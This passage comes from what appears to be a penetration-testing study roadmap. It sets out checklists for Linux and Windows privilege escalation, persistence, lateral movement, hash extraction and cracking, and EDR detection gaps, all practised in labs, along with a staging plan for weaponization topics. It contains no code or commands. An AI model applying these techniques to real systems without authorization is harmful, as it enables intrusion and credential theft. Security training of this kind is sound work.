  > - [ ] Achieve root from a low-privilege foothold using at least 3 different vectors from the 9-vector methodology above (SUID/SGID, sudo misconfigurations, cron job/timer abuse, Linux capabilities, writable system/library files, NFS root squashing, kernel exploits, credential/config file leaks, or PAM module abuse)
  > - [ ] Complete at least 1 of: TryHackMe "Linux PrivEsc" room, HackTheBox Jarvis, or HackTheBox Cronos — with a written walkthrough
  >
  > **Persistence & Lateral Movement**
  >
  > - [ ] Demonstrate 2 Windows persistence mechanisms (registry RunKey, scheduled task, service installation) and identify their Event Log artifacts (Event ID 4688, 7045, 4698)
  > - [ ] Demonstrate host-to-host lateral movement or pivoting in a workgroup/local network lab (e.g., local administrator credential reuse via SMB/WinRM Pass-the-Hash, SSH key harvesting/pivoting, or network tunneling via Chisel/SSH to access an internal subnet). *(Note: Active Directory Kerberos Pass-the-Ticket is strictly tested in Phase 6).*
  >
  > **Defense Evasion**
  >
  > - [ ] Identify what EDR/AV telemetry each technique generates (Sysmon Event ID 1 process creation, Event ID 10 process access) and document a detection gap for at least 1 technique
  >
  > **Reporting**
  >
  > - [ ] Submit 3 full lab attack reports using the Part 39 structure (scope → recon → exploitation → post-exploitation → impact → remediation)
  > - [ ] Each report must have a defender timeline paired with the operator timeline

<a id="toc-part-8-malware--weaponization"></a>

---

## 🔹 Phase 2B: Advanced Offensive Operations

> _Parts 8–11 — Master weaponization, deception, disruption, and network sniffing. These build on the access gained in Phase 2A._

> [!WARNING]
> **Phase 2B Scope Control — Red Team Track**
>
> Do **NOT** treat all of Phase 2B as a prerequisite before Phase 4 (Web). Study core Phase 2B concepts now, then proceed to Phase 4. Return to the deferred Phase 2B topics after completing Phases 4 and 6, when the context makes them far more valuable.
>
> | Part                                 | Priority | Action                                                                 |
> | ------------------------------------ | -------- | ---------------------------------------------------------------------- |
> | **Part 9** — Sniffing & Spoofing     | Core     | Do now — directly supports network understanding                       |
> | **Part 10** — Social Engineering     | Core     | Do now — recon/phishing concepts apply immediately                     |
> | **Part 8** — Malware & Weaponization | Deferred | Do **after Phase 6** — full malware engineering is in Phase 7 Part 42  |
> | **Part 11** — Denial of Service      | Archive  | **Read passively only. No lab time.** No pentest engagement authorizes active DoS on a production network. Conceptual awareness is sufficient. |
>
> **What to defer until after Phase 4 & 6:**
>
> - Advanced malware development / weaponization (Part 8 deep dive → Part 42 is the real home for this)
> - Sophisticated AV/EDR evasion techniques
> - Advanced C2 infrastructure design
> - DoS attack execution against complex targets

---

---

---

<a id="part-8-malware-weaponization"></a>


---

<a id="stage-gate-1"></a>

## 🏁 Stage Gate 1 — Host Dominance & Privilege Escalation

> [!IMPORTANT]
> **Stage 1 Exit Gate:** You cannot pass Stage 2 into Web & Application Security until you can:
> - Root an unassisted intermediate target box on Hack The Box / Proving Grounds.
> - Extract hashes from SAM / `/etc/shadow` and crack them using targeted Hashcat rules.
> - Demonstrate cold privilege escalation on **both Linux** (SUID, sudo, cron) and **Windows** (Token impersonation / Potato, Unquoted service path, DLL hijacking).
> - Document the end-to-end compromise lifecycle in a professional writeup.
